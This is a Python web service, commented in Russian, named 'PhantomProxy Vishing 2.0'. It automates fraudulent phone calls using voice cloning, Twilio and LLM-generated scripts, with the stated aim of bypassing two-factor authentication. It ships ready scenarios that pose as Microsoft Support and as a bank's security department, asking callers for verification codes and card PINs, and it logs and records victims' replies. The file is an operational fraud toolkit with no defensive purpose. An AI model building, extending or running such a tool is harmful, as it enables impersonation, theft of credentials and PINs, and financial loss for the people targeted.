#!/usr/bin/env python3
"""
PhantomProxy Vishing 2.0
Голосовые дипфейки для обхода 2FA

Архитектура:
1. Coqui TTS — клонирование голоса
2. Twilio API — автоматические звонки
3. LLM — динамические сценарии диалогов
"""

import asyncio
import logging
import os
import wave
from pathlib import Path
from typing import Dict, List, Optional
from dataclasses import dataclass
from enum import Enum

from fastapi import FastAPI, HTTPException
from pydantic import BaseModel
import uvicorn

# TTS
from TTS.api import TTS

# Twilio
from twilio.rest import Client
from twilio.twiml.voice_response import VoiceResponse, Gather

# LLM (опционально)
import ollama

# Настройка логирования
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = FastAPI(title="PhantomProxy Vishing 2.0")

# ==================== МОДЕЛИ ДАННЫХ ====================

class CallStatus(str, Enum):
    PENDING = "pending"
    CALLING = "calling"
    IN_PROGRESS = "in_progress"
    COMPLETED = "completed"
    FAILED = "failed"

@dataclass
class VoiceProfile:
    """Профиль голоса"""
    name: str
    reference_audio: str  # Путь к аудио для клонирования
    language: str = "en"
    emotion: str = "neutral"

@dataclass
class CallScenario:
    """Сценарий звонка"""
    name: str
    script: str
    target_prompt: str  # Что хотим получить от жертвы
    max_duration: int = 300  # секунд

class CallRequest(BaseModel):
    """Запрос на звонок"""
    phone_number: str
    voice_profile: str
    scenario: str
    custom_data: Optional[Dict] = None

class CallResponse(BaseModel):
    """Ответ на звонок"""
    success: bool
    call_id: str
    status: str
    message: str
    recording_url: Optional[str] = None

# ==================== VISHING ENGINE ====================

class VishingEngine:
    """Движок голосовых дипфейков"""
    
    def __init__(self, config: Dict):
        self.config = config
        self.tts = None
        self.twilio_client = None
        self.voice_profiles: Dict[str, VoiceProfile] = {}
        self.scenarios: Dict[str, CallScenario] = {}
        self.active_calls: Dict[str, CallStatus] = {}
        
        logger.info("Vishing Engine initialized")
    
    def initialize_tts(self, model_name: str = "tts_models/en/ljspeech/tacotron2-DDC"):
        """Инициализация TTS модели"""
        logger.info(f"Loading TTS model: {model_name}")
        self.tts = TTS(model_name=model_name)
        logger.info("TTS model loaded")
    
    def initialize_twilio(self, account_sid: str, auth_token: str, phone_number: str):
        """Инициализация Twilio"""
        self.twilio_client = Client(account_sid, auth_token)
        self.twilio_phone = phone_number
        logger.info("Twilio initialized")
    
    def register_voice(self, name: str, reference_audio: str, language: str = "en"):
        """Регистрация голосового профиля"""
        if not os.path.exists(reference_audio):
            raise FileNotFoundError(f"Audio file not found: {reference_audio}")
        
        self.voice_profiles[name] = VoiceProfile(
            name=name,
            reference_audio=reference_audio,
            language=language
        )
        
        logger.info(f"Voice profile registered: {name}")
    
    def register_scenario(self, name: str, script: str, target_prompt: str, max_duration: int = 300):
        """Регистрация сценария"""
        self.scenarios[name] = CallScenario(
            name=name,
            script=script,
            target_prompt=target_prompt,
            max_duration=max_duration
        )
        
        logger.info(f"Scenario registered: {name}")
    
    def generate_speech(self, text: str, voice_profile: str, output_path: str) -> str:
        """Генерация речи"""
        if voice_profile not in self.voice_profiles:
            raise ValueError(f"Voice profile not found: {voice_profile}")
        
        profile = self.voice_profiles[voice_profile]
        
        # Генерация с клонированием голоса
        self.tts.tts_to_file(
            text=text,
            speaker_wav=profile.reference_audio,
            language=profile.language,
            file_path=output_path
        )
        
        logger.info(f"Speech generated: {output_path}")
        return output_path
    
    async def make_call(self, phone_number: str, voice_profile: str, scenario: str) -> str:
        """Совершение звонка"""
        if scenario not in self.scenarios:
            raise ValueError(f"Scenario not found: {scenario}")
        
        call_scenario = self.scenarios[scenario]
        
        # Генерация TwiML
        twiml = self.generate_twiml(call_scenario)
        
        # Звонок через Twilio
        call = self.twilio_client.calls.create(
            twiml=twiml,
            to=phone_number,
            from_=self.twilio_phone,
            status_callback_event=['initiated', 'ringing', 'in-progress', 'completed']
        )
        
        call_id = call.sid
        self.active_calls[call_id] = CallStatus.CALLING
        
        logger.info(f"Call initiated: {call_id} to {phone_number}")
        return call_id
    
    def generate_twiml(self, scenario: CallScenario) -> str:
        """Генерация TwiML для звонка"""
        resp = VoiceResponse()
        
        # Приветствие
        resp.say(scenario.script, voice='alice', rate='medium')
        
        # Сбор ответа (DTMF или голос)
        gather = Gather(
            input='speech dtmf',
            action='/gather_response',
            method='POST',
            timeout=5,
            speech_timeout='auto'
        )
        
        gather.say(scenario.target_prompt, voice='alice')
        resp.append(gather)
        
        # Если нет ответа
        resp.say("Thank you. Goodbye.", voice='alice')
        
        return str(resp)
    
    async def gather_response(self, call_id: str, response: str) -> Dict:
        """Обработка ответа от жертвы"""
        logger.info(f"Call {call_id} - Response received: {response}")
        
        # Сохранение ответа
        result = {
            'call_id': call_id,
            'response': response,
            'timestamp': asyncio.get_event_loop().time()
        }
        
        # Обновление статуса
        self.active_calls[call_id] = CallStatus.COMPLETED
        
        return result
    
    def get_call_status(self, call_id: str) -> CallStatus:
        """Получение статуса звонка"""
        return self.active_calls.get(call_id, CallStatus.FAILED)
    
    def get_call_recording(self, call_id: str) -> Optional[str]:
        """Получение записи звонка"""
        # Получение записи из Twilio
        call = self.twilio_client.calls(call_id).fetch()
        recordings = call.recordings.list()
        
        if recordings:
            return f"https://api.twilio.com{recordings[0].uri}"
        
        return None

# ==================== LLM INTEGRATION ====================

class LLMScenarioGenerator:
    """Генерация сценариев через LLM"""
    
    def __init__(self, model: str = "llama3.2"):
        self.model = model
    
    def generate_scenario(self, target_service: str, goal: str) -> CallScenario:
        """Генерация сценария для целевого сервиса"""
        prompt = f"""
Generate a vishing script for {target_service} with the goal: {goal}.

Return JSON:
{{
    "name": "scenario_name",
    "script": "greeting script",
    "target_prompt": "what to ask from victim",
    "max_duration": 300
}}
"""
        response = ollama.generate(model=self.model, prompt=prompt)
        
        # Парсинг JSON (упрощённо)
        import json
        scenario_data = json.loads(response['response'])
        
        return CallScenario(
            name=scenario_data['name'],
            script=scenario_data['script'],
            target_prompt=scenario_data['target_prompt'],
            max_duration=scenario_data.get('max_duration', 300)
        )

# ==================== API ENDPOINTS ====================

# Глобальный engine
vishing_engine = VishingEngine({})

@app.on_event("startup")
async def startup_event():
    """Инициализация при старте"""
    # TTS
    vishing_engine.initialize_tts()
    
    # Twilio (из env)
    vishing_engine.initialize_twilio(
        account_sid=os.getenv("TWILIO_ACCOUNT_SID"),
        auth_token=os.getenv("TWILIO_AUTH_TOKEN"),
        phone_number=os.getenv("TWILIO_PHONE_NUMBER")
    )
    
    # Регистрация голосов
    voices_dir = Path("./voices")
    voices_dir.mkdir(exist_ok=True)
    
    # Пример: register_voice("support_agent", "./voices/support.wav")
    
    # Регистрация сценариев
    vishing_engine.register_scenario(
        name="microsoft_support",
        script="Hello, this is Microsoft Support. We detected suspicious activity on your account.",
        target_prompt="Please enter your verification code.",
        max_duration=300
    )
    
    vishing_engine.register_scenario(
        name="bank_security",
        script="Hello, this is your bank's security department. We need to verify your identity.",
        target_prompt="Please enter your card PIN.",
        max_duration=300
    )

@app.post("/api/v1/vishing/call", response_model=CallResponse)
async def make_call(request: CallRequest):
    """Совершение звонка"""
    try:
        call_id = await vishing_engine.make_call(
            phone_number=request.phone_number,
            voice_profile=request.voice_profile,
            scenario=request.scenario
        )
        
        return CallResponse(
            success=True,
            call_id=call_id,
            status="initiated",
            message="Call initiated successfully"
        )
    except Exception as e:
        logger.error(f"Call failed: {str(e)}")
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/api/v1/vishing/call/{call_id}")
async def get_call_status(call_id: str):
    """Статус звонка"""
    status = vishing_engine.get_call_status(call_id)
    
    recording_url = vishing_engine.get_call_recording(call_id)
    
    return {
        "call_id": call_id,
        "status": status.value,
        "recording_url": recording_url
    }

@app.post("/api/v1/vishing/voice")
async def register_voice(name: str, reference_audio: str, language: str = "en"):
    """Регистрация голоса"""
    try:
        vishing_engine.register_voice(name, reference_audio, language)
        return {"success": True, "message": f"Voice {name} registered"}
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))

@app.post("/api/v1/vishing/scenario")
async def register_scenario(name: str, script: str, target_prompt: str, max_duration: int = 300):
    """Регистрация сценария"""
    vishing_engine.register_scenario(name, script, target_prompt, max_duration)
    return {"success": True, "message": f"Scenario {name} registered"}

@app.post("/api/v1/vishing/generate-scenario")
async def generate_scenario(target_service: str, goal: str):
    """Генерация сценария через LLM"""
    llm_gen = LLMScenarioGenerator()
    scenario = llm_gen.generate_scenario(target_service, goal)
    
    return {
        "success": True,
        "scenario": {
            "name": scenario.name,
            "script": scenario.script,
            "target_prompt": scenario.target_prompt,
            "max_duration": scenario.max_duration
        }
    }

@app.get("/health")
async def health_check():
    return {"status": "ok", "service": "vishing"}

# ==================== ЗАПУСК ====================

if __name__ == "__main__":
    uvicorn.run(
        "main:app",
        host="0.0.0.0",
        port=8082,
        reload=True,
    )
